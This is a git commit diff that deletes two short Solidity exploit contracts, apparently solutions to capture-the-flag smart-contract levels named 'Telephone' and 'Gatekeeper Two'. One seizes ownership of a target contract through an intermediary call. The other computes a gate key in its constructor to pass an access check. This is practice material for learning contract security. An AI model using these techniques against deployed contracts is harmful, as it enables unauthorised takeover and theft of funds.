6cfbf4c609dd578301debcd942634ced099a1b8d
Vinko Bradvica <vinko.bradvica@gmail.com>
2019-09-27 13:36:01 +0200

    Change solution structure

--- 04. Telephone/StealYourPhone.sol
+++
@@ -1,7 +0,0 @@
-pragma solidity ^0.4.18;
-
-contract StealYourPhone {
-    function changeOwner(address _telephone) {
-        Telephone(_telephone).changeOwner(msg.sender);
-    }
-}
--- 14. Gatekeeper Two/GateKeyTwo.sol
+++
@@ -1,9 +0,0 @@
-pragma solidity ^0.4.18;
-
-contract GateKeyTwo {
-  function GateKeyTwo(address gate) public {
-    GatekeeperTwo _gate = GatekeeperTwo(gate);
-    bytes8 key = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1));
-    _gate.enter(key);
-  }
-}
